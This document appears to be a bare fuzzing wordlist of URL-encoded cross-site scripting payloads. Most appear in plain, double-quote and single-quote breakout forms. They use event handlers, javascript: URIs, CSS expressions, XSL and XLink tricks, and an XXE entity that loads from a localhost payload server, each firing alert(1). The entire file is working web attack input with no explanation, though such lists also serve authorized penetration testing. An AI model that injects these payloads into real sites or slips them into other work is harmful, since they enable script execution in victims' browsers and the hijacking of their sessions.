+%3Cdiv%20id=%22div1%22%3E%3Cinput%20value=%22%60%60onmouseover=alert(1)%22%3E%3C/div%3E%20%3Cdiv%20id=%22div2%22%3E%3C/div%3E%3Cscript%3Edocument.getElementById(%22div2%22).innerHTML%20=%20document.getElementById(%22div1%22).innerHTML;%3C/script%3E  
+%22%3E%3Cdiv%20id=%22div1%22%3E%3Cinput%20value=%22%60%60onmouseover=alert(1)%22%3E%3C/div%3E%20%3Cdiv%20id=%22div2%22%3E%3C/div%3E%3Cscript%3Edocument.getElementById(%22div2%22).innerHTML%20=%20document.getElementById(%22div1%22).innerHTML;%3C/script%3E  
+'%3E%3Cdiv%20id=%22div1%22%3E%3Cinput%20value=%22%60%60onmouseover=alert(1)%22%3E%3C/div%3E%20%3Cdiv%20id=%22div2%22%3E%3C/div%3E%3Cscript%3Edocument.getElementById(%22div2%22).innerHTML%20=%20document.getElementById(%22div1%22).innerHTML;%3C/script%3E%3C/div%3E  
+%22%3E%3Cdiv%20id=%22div1%22%3E%3Cinput%20value=%22%60%60onmouseover=alert(1)%22%3E%3C/div%3E%20%3Cdiv%20id=%22div2%22%3E%3C/div%3E%3Cscript%3Edocument.getElementById(%22div2%22).innerHTML%20=%20document.getElementById(%22div1%22).innerHTML;%3C/script%3E%3C/div%3E  
+'%3E%3Cdiv%20id=%22div1%22%3E%3Cinput%20value=%22%60%60onmouseover=alert(1)%22%3E%3C/div%3E%20%3Cdiv%20id=%22div2%22%3E%3C/div%3E%3Cscript%3Edocument.getElementById(%22div2%22).innerHTML%20=%20document.getElementById(%22div1%22).innerHTML;%3C/script%3E%3C/div%3E  
+%3Cx%20'=%22foo%22%3E%3Cx%20foo='%3E%3Cimg%20src=x%20onerror=alert(1)//'%3E  
+%22%3E%3Cx%20'=%22foo%22%3E%3Cx%20foo='%3E%3Cimg%20src=x%20onerror=alert(1)//'%3E  
+'%3E%3Cx%20'=%22foo%22%3E%3Cx%20foo='%3E%3Cimg%20src=x%20onerror=alert(1)//'%3E  
+%3C!%20'=%22foo%22%3E%3Cx%20foo='%3E%3Cimg%20src=x%20onerror=alert(1)//'%3E  
+%22%3E%3C!%20'=%22foo%22%3E%3Cx%20foo='%3E%3Cimg%20src=x%20onerror=alert(1)//'%3E  
+'%3E%3C!%20'=%22foo%22%3E%3Cx%20foo='%3E%3Cimg%20src=x%20onerror=alert(1)//'%3E  
+%3C?%20'=%22foo%22%3E%3Cx%20foo='%3E%3Cimg%20src=x%20onerror=alert(1)//'%3E  
+%22%3E%3C?%20'=%22foo%22%3E%3Cx%20foo='%3E%3Cimg%20src=x%20onerror=alert(1)//'%3E  
+'%3E%3C?%20'=%22foo%22%3E%3Cx%20foo='%3E%3Cimg%20src=x%20onerror=alert(1)//'%3E  
+%3Cdiv%20id=%221%22%3E%3Cembed%20src=%22javascript:alert(1)%22%3E  
+%22%3E%3Cembed%20src=%22javascript:alert(1)%22%3E  
+'%3E%3Cembed%20src=%22javascript:alert(1)%22%3E%3C/embed%3E  
+%3Cscript%20src=%22javascript:alert(1)%22%3E  
+%22%3E%3Cscript%20src=%22javascript:alert(1)%22%3E  
+'%3E%3Cscript%20src=%22javascript:alert(1)%22%3E%3C/script%3E  
+%22%3E%3Cscript%20src=%22javascript:alert(1)%22%3E%3C/script%3E  
+'%3E%3Cscript%20src=%22javascript:alert(1)%22%3E%3C/script%3E  
+%3C!DOCTYPE%20x[%3C!ENTITY%20x%20SYSTEM%20%22http://127.0.0.1:3555/xss_serve_payloads/X.xxe%22%3E]%3E%3Cy%3E&x;%3C/y%3E  
+%22%3E%3C!DOCTYPE%20x[%3C!ENTITY%20x%20SYSTEM%20%22http://127.0.0.1:3555/xss_serve_payloads/X.xxe%22%3E]%3E%3Cy%3E&x;%3C/y%3E  
+'%3E%3C!DOCTYPE%20x[%3C!ENTITY%20x%20SYSTEM%20%22http://127.0.0.1:3555/xss_serve_payloads/X.xxe%22%3E]%3E%3Cy%3E&x;%3C/y%3E  
+%3C?xml-stylesheet%20type=%22text/xsl%22%20href=%22data:,%3Cxsl:transform%20version='1.0'%20xmlns:xsl='http://www.w3.org/1999/XSL/Transform'%20id='xss'%3E%3Cxsl:output%20method='html'/%3E%3Cxsl:template%20match='/'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E%22?%3E  
+%22%3E%3C?xml-stylesheet%20type=%22text/xsl%22%20href=%22data:,%3Cxsl:transform%20version='1.0'%20xmlns:xsl='http://www.w3.org/1999/XSL/Transform'%20id='xss'%3E%3Cxsl:output%20method='html'/%3E%3Cxsl:template%20match='/'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E%22?%3E  
+'%3E%3C?xml-stylesheet%20type=%22text/xsl%22%20href=%22data:,%3Cxsl:transform%20version='1.0'%20xmlns:xsl='http://www.w3.org/1999/XSL/Transform'%20id='xss'%3E%3Cxsl:output%20method='html'/%3E%3Cxsl:template%20match='/'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E%22?%3E  
+onerror%20CDATA%20%22alert(1)%22  
+onload%20CDATA%20%22alert(1)%22%3E  
+%3Chtml:style%20/%3E%3Cx%20xlink:href=%22javascript:alert(1)%22%20xlink:type=%22simple%22%3EXXX%3C/x%3E  
+%22%3E%3Chtml:style%20/%3E%3Cx%20xlink:href=%22javascript:alert(1)%22%20xlink:type=%22simple%22%3EXXX%3C/x%3E  
+'%3E%3Chtml:style%20/%3E%3Cx%20xlink:href=%22javascript:alert(1)%22%20xlink:type=%22simple%22%3EXXX%3C/x%3E  
+%3Ccard%20xmlns=%22http://www.wapforum.org/2001/wml%22%3E%3Conevent%20type=%22ontimer%22%3E%3Cgo%20href=%22javascript:alert(1)%22/%3E%3C/onevent%3E%3Ctimer%20value=%221%22/%3E%3C/card%3E  
+%22%3E%3Ccard%20xmlns=%22http://www.wapforum.org/2001/wml%22%3E%3Conevent%20type=%22ontimer%22%3E%3Cgo%20href=%22javascript:alert(1)%22/%3E%3C/onevent%3E%3Ctimer%20value=%221%22/%3E%3C/card%3E  
+'%3E%3Ccard%20xmlns=%22http://www.wapforum.org/2001/wml%22%3E%3Conevent%20type=%22ontimer%22%3E%3Cgo%20href=%22javascript:alert(1)%22/%3E%3C/onevent%3E%3Ctimer%20value=%221%22/%3E%3C/card%3E  
+%3Cdiv%20style=width:1px;filter:glow%20onfilterchange=alert(1)%3Ex  
+%22%3E%3Cdiv%20style=width:1px;filter:glow%20onfilterchange=alert(1)%3Ex  
+'%3E%3Cdiv%20style=width:1px;filter:glow%20onfilterchange=alert(1)%3Ex  
+%3C//%20style=x:expression%028alert(1)%029%3E  
+%22%3E%3C//%20style=x:expression%028alert(1)%029%3E  
+'%3E%3C//%20style=x:expression%028alert(1)%029%3E  
+%3Cevent-source%20src=%22index.php%22%20onload=%22alert(1)%22%3E  
+%22%3E%3Cevent-source%20src=%22index.php%22%20onload=%22alert(1)%22%3E  
+'%3E%3Cevent-source%20src=%22index.php%22%20onload=%22alert(1)%22%3E  
+%3Ca%20href=%22javascript:alert(1)%22%3E%3Cevent-source%20src=%22data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A%22%20/%3E%3C/a%3E  
+%22%3E%3Ca%20href=%22javascript:alert(1)%22%3E%3Cevent-source%20src=%22data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A%22%20/%3E%3C/a%3E  
+'%3E%3Ca%20href=%22javascript:alert(1)%22%3E%3Cevent-source%20src=%22data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A%22%20/%3E%3C/a%3E  
+%3C?xml-stylesheet%20type=%22text/css%22?%3E%3Croot%20style=%22x:expression(alert(1))%22/%3E  
+%22%3E%3C?xml-stylesheet%20type=%22text/css%22?%3E%3Croot%20style=%22x:expression(alert(1))%22/%3E  
+'%3E%3C?xml-stylesheet%20type=%22text/css%22?%3E%3Croot%20style=%22x:expression(alert(1))%22/%3E  
+%3Cobject%20allowscriptaccess=%22always%22%20data=%22test.swf%22%3E%3C/object%3E  
+%22%3E%3Cobject%20allowscriptaccess=%22always%22%20data=%22test.swf%22%3E%3C/object%3E  
+'%3E%3Cobject%20allowscriptaccess=%22always%22%20data=%22test.swf%22%3E%3C/object%3E  
+%3Cstyle%3E*%7Bx:%EF%BD%85%EF%BD%98%EF%BD%90%EF%BD%92%EF%BD%85%EF%BD%93%EF%BD%93%EF%BD%89%EF%BD%8F%EF%BD%8E(alert(1))%7D%3C/style%3E  
+%22%3E%3Cstyle%3E*%7Bx:%EF%BD%85%EF%BD%98%EF%BD%90%EF%BD%92%EF%BD%85%EF%BD%93%EF%BD%93%EF%BD%89%EF%BD%8F%EF%BD%8E(alert(1))%7D%3C/style%3E  
+'%3E%3Cstyle%3E*%7Bx:%EF%BD%85%EF%BD%98%EF%BD%90%EF%BD%92%EF%BD%85%EF%BD%93%EF%BD%93%EF%BD%89%EF%BD%8F%EF%BD%8E(alert(1))%7D%3C/style%3E  
+%3Cx%20xmlns:xlink=%22http://www.w3.org/1999/xlink%22%20xlink:actuate=%22onLoad%22%20xlink:href=%22javascript:alert(1)%22%20xlink:type=%22simple%22/%3E  
+%22%3E%3Cx%20xmlns:xlink=%22http://www.w3.org/1999/xlink%22%20xlink:actuate=%22onLoad%22%20xlink:href=%22javascript:alert(1)%22%20xlink:type=%22simple%22/%3E  
+'%3E%3Cx%20xmlns:xlink=%22http://www.w3.org/1999/xlink%22%20xlink:actuate=%22onLoad%22%20xlink:href=%22javascript:alert(1)%22%20xlink:type=%22simple%22/%3E  
+%3C?xml-stylesheet%20type=%22text/css%22%20href=%22data:,*%7bx:expression(write(1));%7d%22?%3E  
+%22%3E%3C?xml-stylesheet%20type=%22text/css%22%20href=%22data:,*%7bx:expression(write(1));%7d%22?%3E  
+'%3E%3C?xml-stylesheet%20type=%22text/css%22%20href=%22data:,*%7bx:expression(write(1));%7d%22?%3E  
+%3Cx:template%20xmlns:x=%22http://www.wapforum.org/2001/wml%22%20%20x:ontimer=%22$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)%22%3E%3Cx:timer%20value=%221%22/%3E%3C/x:template%3E  
+%22%3E%3Cx:template%20xmlns:x=%22http://www.wapforum.org/2001/wml%22%20%20x:ontimer=%22$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)%22%3E%3Cx:timer%20value=%221%22/%3E%3C/x:template%3E  
+'%3E%3Cx:template%20xmlns:x=%22http://www.wapforum.org/2001/wml%22%20%20x:ontimer=%22$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)%22%3E%3Cx:timer%20value=%221%22/%3E%3C/x:template%3E  
+%3Cx%20xmlns:ev=%22http://www.w3.org/2001/xml-events%22%20ev:event=%22load%22%20ev:handler=%22javascript:alert(1)//  
+%22%3E%3Cx%20xmlns:ev=%22http://www.w3.org/2001/xml-events%22%20ev:event=%22load%22%20ev:handler=%22javascript:alert(1)//  
+'%3E%3Cx%20xmlns:ev=%22http://www.w3.org/2001/xml-events%22%20ev:event=%22load%22%20ev:handler=%22javascript:alert(1)//  
+%3Cbody%20oninput=alert(1)%3E%3Cinput%20autofocus%3E  
+%22%3E%3Cbody%20oninput=alert(1)%3E%3Cinput%20autofocus%3E  
+'%3E%3Cbody%20oninput=alert(1)%3E%3Cinput%20autofocus%3E%3Cdiv%20id=%221%22%3E%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%3E  
+%22%3E%3Cbody%20oninput=alert(1)%3E%3Cinput%20autofocus%3E%3Cdiv%20id=%221%22%3E%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%3E  
+'%3E%3Cbody%20oninput=alert(1)%3E%3Cinput%20autofocus%3E%3Cdiv%20id=%221%22%3E%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%3E  
